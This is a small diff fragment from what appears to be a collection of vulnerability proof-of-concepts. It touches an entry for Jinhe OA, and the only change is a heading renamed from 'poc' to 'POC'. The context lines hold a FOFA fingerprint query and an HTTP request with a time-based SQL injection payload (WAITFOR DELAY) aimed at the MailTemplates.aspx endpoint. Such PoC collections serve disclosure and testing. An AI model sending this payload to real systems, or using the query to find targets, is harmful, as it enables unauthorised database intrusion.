@@ -5,7 +5,7 @@
 app="金和网络-金和OA"
 ```
 
-## poc
+## POC
 ```
 GET /C6/JHSoft.Web.Mail/MailTemplates.aspx/?tempID=1%3BWAITFOR+DELAY+%270%3A0%3A3%27-- HTTP/1.1
 Host: you_ip
